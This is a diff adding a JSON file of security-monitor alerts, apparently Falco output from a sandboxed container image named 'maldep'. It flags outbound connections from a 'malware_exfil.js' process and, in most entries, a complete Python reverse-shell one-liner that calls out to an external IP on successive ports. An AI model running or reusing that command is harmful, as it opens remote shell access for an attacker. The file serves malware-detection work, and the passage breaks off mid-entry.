@@ -1,0 +1,2066 @@
+{
+  "status": "finished",
+  "id": "7304b4d0-6e8c-4254-8357-2c34d02d26d0",
+  "result": [
+    {
+      "output_fields": {
+        "user.name": "root",
+        "evt.time": "09:06:52.306678508",
+        "fd.name": "172.17.0.2:41731->3.248.33.252:0",
+        "container.id": "3915af6ed50f",
+        "proc.cmdline": "node malware_exfil.js",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "container.image.repository": "maldep"
+      },
+      "time": {
+        "seconds": "1764752812",
+        "nanos": 306678508
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:06:52.306678508: Notice Disallowed outbound connection destination (command=node malware_exfil.js connection=172.17.0.2:41731->3.248.33.252:0 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "fd.name": "172.17.0.2:53056->54.77.139.23:0",
+        "proc.cmdline": "node malware_exfil.js",
+        "container.image.repository": "maldep",
+        "evt.time": "09:06:52.306684858",
+        "user.name": "root",
+        "container.id": "3915af6ed50f"
+      },
+      "time": {
+        "seconds": "1764752812",
+        "nanos": 306684858
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:06:52.306684858: Notice Disallowed outbound connection destination (command=node malware_exfil.js connection=172.17.0.2:53056->54.77.139.23:0 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "container.id": "3915af6ed50f",
+        "user.name": "root",
+        "proc.cmdline": "node malware_exfil.js",
+        "fd.name": "172.17.0.2:52504->3.248.33.252:443",
+        "evt.time": "09:06:52.307516246",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "container.image.repository": "maldep"
+      },
+      "time": {
+        "seconds": "1764752812",
+        "nanos": 307516246
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:06:52.307516246: Notice Disallowed outbound connection destination (command=node malware_exfil.js connection=172.17.0.2:52504->3.248.33.252:443 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "evt.time": "09:06:53.918981585",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22857)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "fd.name": "0.0.0.0:50352->77.244.210.247:22857",
+        "container.image.repository": "maldep",
+        "user.name": "root",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "container.id": "3915af6ed50f"
+      },
+      "time": {
+        "seconds": "1764752813",
+        "nanos": 918981585
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:06:53.918981585: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22857)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:50352->77.244.210.247:22857 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22858)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "fd.name": "0.0.0.0:59594->77.244.210.247:22858",
+        "evt.time": "09:06:54.267511593",
+        "user.name": "root",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "container.image.repository": "maldep",
+        "container.id": "3915af6ed50f"
+      },
+      "time": {
+        "seconds": "1764752814",
+        "nanos": 267511593
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:06:54.267511593: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22858)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:59594->77.244.210.247:22858 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "fd.name": "0.0.0.0:57012->77.244.210.247:22859",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22859)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.id": "3915af6ed50f",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "evt.time": "09:06:54.706161303",
+        "user.name": "root",
+        "container.image.repository": "maldep"
+      },
+      "time": {
+        "seconds": "1764752814",
+        "nanos": 706161303
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:06:54.706161303: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22859)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:57012->77.244.210.247:22859 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "user.name": "root",
+        "container.image.repository": "maldep",
+        "container.id": "3915af6ed50f",
+        "fd.name": "0.0.0.0:52802->77.244.210.247:22860",
+        "evt.time": "09:06:55.036656732",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22860)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz"
+      },
+      "time": {
+        "seconds": "1764752815",
+        "nanos": 36656732
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:06:55.036656732: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22860)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:52802->77.244.210.247:22860 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "fd.name": "0.0.0.0:38472->77.244.210.247:22861",
+        "container.id": "3915af6ed50f",
+        "user.name": "root",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22861)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.image.repository": "maldep",
+        "evt.time": "09:06:55.384336795"
+      },
+      "time": {
+        "seconds": "1764752815",
+        "nanos": 384336795
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:06:55.384336795: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22861)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:38472->77.244.210.247:22861 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22862)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.id": "3915af6ed50f",
+        "container.image.repository": "maldep",
+        "evt.time": "09:06:55.826342841",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "fd.name": "0.0.0.0:50314->77.244.210.247:22862",
+        "user.name": "root"
+      },
+      "time": {
+        "seconds": "1764752815",
+        "nanos": 826342841
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:06:55.826342841: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22862)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:50314->77.244.210.247:22862 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "evt.time": "09:06:56.164354766",
+        "container.id": "3915af6ed50f",
+        "user.name": "root",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "fd.name": "0.0.0.0:50122->77.244.210.247:22863",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22863)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.image.repository": "maldep"
+      },
+      "time": {
+        "seconds": "1764752816",
+        "nanos": 164354766
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:06:56.164354766: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22863)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:50122->77.244.210.247:22863 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "evt.time": "09:06:56.629327865",
+        "container.image.repository": "maldep",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "container.id": "3915af6ed50f",
+        "fd.name": "0.0.0.0:54010->77.244.210.247:22864",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22864)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "user.name": "root"
+      },
+      "time": {
+        "seconds": "1764752816",
+        "nanos": 629327865
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:06:56.629327865: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22864)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:54010->77.244.210.247:22864 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22865)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.image.repository": "maldep",
+        "fd.name": "0.0.0.0:54358->77.244.210.247:22865",
+        "container.id": "3915af6ed50f",
+        "evt.time": "09:06:57.108642280",
+        "user.name": "root"
+      },
+      "time": {
+        "seconds": "1764752817",
+        "nanos": 108642280
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:06:57.108642280: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22865)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:54358->77.244.210.247:22865 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "user.name": "root",
+        "fd.name": "0.0.0.0:58152->77.244.210.247:22866",
+        "container.image.repository": "maldep",
+        "container.id": "3915af6ed50f",
+        "evt.time": "09:06:57.597765869",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22866)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);"
+      },
+      "time": {
+        "seconds": "1764752817",
+        "nanos": 597765869
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:06:57.597765869: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22866)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:58152->77.244.210.247:22866 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "evt.time": "09:06:57.954268848",
+        "container.id": "3915af6ed50f",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22867)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.image.repository": "maldep",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "fd.name": "0.0.0.0:34666->77.244.210.247:22867",
+        "user.name": "root"
+      },
+      "time": {
+        "seconds": "1764752817",
+        "nanos": 954268848
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:06:57.954268848: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22867)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:34666->77.244.210.247:22867 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "evt.time": "09:06:58.387142260",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "container.id": "3915af6ed50f",
+        "fd.name": "0.0.0.0:40566->77.244.210.247:22868",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22868)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.image.repository": "maldep",
+        "user.name": "root"
+      },
+      "time": {
+        "seconds": "1764752818",
+        "nanos": 387142260
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:06:58.387142260: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22868)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:40566->77.244.210.247:22868 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "container.id": "3915af6ed50f",
+        "container.image.repository": "maldep",
+        "user.name": "root",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22869)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "evt.time": "09:06:58.870545966",
+        "fd.name": "0.0.0.0:42668->77.244.210.247:22869",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz"
+      },
+      "time": {
+        "seconds": "1764752818",
+        "nanos": 870545966
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:06:58.870545966: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22869)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:42668->77.244.210.247:22869 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "container.image.repository": "maldep",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22870)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.id": "3915af6ed50f",
+        "user.name": "root",
+        "fd.name": "0.0.0.0:32898->77.244.210.247:22870",
+        "evt.time": "09:06:59.346974461"
+      },
+      "time": {
+        "seconds": "1764752819",
+        "nanos": 346974461
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:06:59.346974461: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22870)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:32898->77.244.210.247:22870 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "evt.time": "09:06:59.827853717",
+        "user.name": "root",
+        "container.image.repository": "maldep",
+        "container.id": "3915af6ed50f",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "fd.name": "0.0.0.0:43530->77.244.210.247:22871",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22871)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);"
+      },
+      "time": {
+        "seconds": "1764752819",
+        "nanos": 827853717
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:06:59.827853717: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22871)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:43530->77.244.210.247:22871 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "fd.name": "0.0.0.0:41576->77.244.210.247:22872",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22872)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.id": "3915af6ed50f",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "user.name": "root",
+        "evt.time": "09:07:00.160154334",
+        "container.image.repository": "maldep"
+      },
+      "time": {
+        "seconds": "1764752820",
+        "nanos": 160154334
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:00.160154334: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22872)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:41576->77.244.210.247:22872 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "container.id": "3915af6ed50f",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22873)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "user.name": "root",
+        "container.image.repository": "maldep",
+        "fd.name": "0.0.0.0:34568->77.244.210.247:22873",
+        "evt.time": "09:07:00.511214583"
+      },
+      "time": {
+        "seconds": "1764752820",
+        "nanos": 511214583
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:00.511214583: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22873)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:34568->77.244.210.247:22873 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "user.name": "root",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22874)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.image.repository": "maldep",
+        "evt.time": "09:07:00.847783092",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "container.id": "3915af6ed50f",
+        "fd.name": "0.0.0.0:50956->77.244.210.247:22874"
+      },
+      "time": {
+        "seconds": "1764752820",
+        "nanos": 847783092
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:00.847783092: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22874)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:50956->77.244.210.247:22874 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "fd.name": "0.0.0.0:59086->77.244.210.247:22875",
+        "user.name": "root",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22875)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.id": "3915af6ed50f",
+        "container.image.repository": "maldep",
+        "evt.time": "09:07:01.185914984",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz"
+      },
+      "time": {
+        "seconds": "1764752821",
+        "nanos": 185914984
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:01.185914984: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22875)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:59086->77.244.210.247:22875 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "container.image.repository": "maldep",
+        "evt.time": "09:07:01.592401846",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22876)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "fd.name": "0.0.0.0:37980->77.244.210.247:22876",
+        "user.name": "root",
+        "container.id": "3915af6ed50f"
+      },
+      "time": {
+        "seconds": "1764752821",
+        "nanos": 592401846
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:01.592401846: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22876)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:37980->77.244.210.247:22876 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22877)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
